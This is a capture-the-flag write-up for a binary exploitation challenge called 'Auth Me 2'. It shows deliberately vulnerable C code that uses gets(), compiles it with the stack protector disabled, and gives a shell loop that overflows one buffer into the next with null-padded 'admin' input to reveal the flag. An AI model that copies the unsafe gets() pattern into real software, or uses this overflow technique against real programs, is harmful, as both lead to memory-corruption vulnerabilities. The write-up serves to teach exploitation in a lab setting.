# Binary Exploitation

Challenge Name : Auth Me 2

# Solution

Use the webshell and go to the directory stated in the challenge's description

![[Pasted image 20210611164539.png]]

Before we run let's analyze the source code first.


```c
#include <stdio.h>                                                                                                                                                                              
#include <stdlib.h>                                                                                                                                                                             
#include <string.h>                                                                                                                                                                             
#include <signal.h>                                                                                                                                                                             
                                                                                                                                                                                                
#define FLAGSIZE_MAX 64                                                                                                                                                                         
                                                                                                                                                                                                
char flag[FLAGSIZE_MAX];                                                                                                                                                                        
                                                                                                                                                                                                
void setup(){                                                                                                                                                                                   
  FILE *f = fopen("flag.txt","r");                                                                                                                                                              
  fgets(flag,FLAGSIZE_MAX,f);                                                                                                                                                                   
  gid_t gid = getegid();                                                                                                                                                                        
  setresgid(gid, gid, gid);                                                                                                                                                                     
}                                                                                                                                                                                               
                                                                                                                                                                                                
int main(int argc, char **argv){                                                                                                                                                                
  setup();                                                                                                                                                                                      
  char user[8];                                                                                                                                                                                 
  char pass[8];                                                                                                                                                                                 
  printf("Authenticate Me 2.0\n");                                                                                                                                                              
  printf("--------------------------------\n");                                                                                                                                                 
  printf("Enter your username: ");                                                                                                                                                              
  gets(user);                                                                                                                                                                                   
  if(strcmp(user,"admin") == 0){                                                                                                                                                                
    printf("Don't pretent you're admin =(\n");                                                                                                                                                  
    return 0;                                                                                                                                                                                   
  }                                                                                                                                                                                             
  printf("Enter your password: ");                                                                                                                                                              
  gets(pass);                                                                                                                                                                                   
  if(strcmp(user,"admin") == 0 && strcmp(pass,"admin") == 0){                                                                                                                                   
    printf("Welcome admin! Here is your flag: %s",flag);                                                                                                                                        
  }else if(strcmp(user,"user") == 0 && strcmp(pass,"user") == 0){                                                                                                                               
    printf("Welcome %s! You're authenticated!\n");                                                                                                                                              
  }else{                                                                                                                                                                                        
    printf("Invalid Username %s or Password %s\n",user,pass);                                                                                                                                   
    printf("Hint: Distance between user and pass is %i\n",user-pass);                                                                                                                           
  }                                                                                                                                                                                             
  return 0;                                                                                                                                                                                     
} 
```

We know that the username and password should be `admin:admin` but how can we bypass the first if statement and get the correct user and pass. We know for sure we can do buffer overflow with the `gets()`.  First let's copy the code and save it in one file `auth2.c` and compile it. Also don't forget to create one `flag.txt`.

```bash
gcc auth2.c -o auth2 -fno-stack-protector
```

Now we should be able to run the binary. When we input something in `user`, as long it is comparing with `admin` we can't get pass it.What if we just ignore the `user` and buffer overflow the password with our username and password?

Run it with gdb and set a breakpoint in `strcmp` for username and password. The first `strmp` in the image below shows it comparing with `user` variable. The second `strmp` in the image below shows it comparing with the `pass` variable.

![[Pasted image 20210611173733.png]]

![[Pasted image 20210611174018.png]]

Run this on other terminal to write our payload in a file. This payload will skip the username part and just go on with password.

```bash
echo -e "\naaaaaaaaaaaaaaa" > input.txt
```

Then pass it to our program 

```bash
run auth2 < input.txt
```

![[Pasted image 20210611174341.png]]

We can see that the user variable hold the value of characters `a`. We can try write `admin` and add it with null byte till we found the correct one to fill in the `pass` variable with `admin`. So here the fuzzing part if you want to try

```bash
for i in {1..10};do python3 -c "print('\nadmin'+('\x00' * $i)+'admin')" | ./auth2;done
```

Run and we get the flag!

# Flag

![[Pasted image 20210611174808.png]]



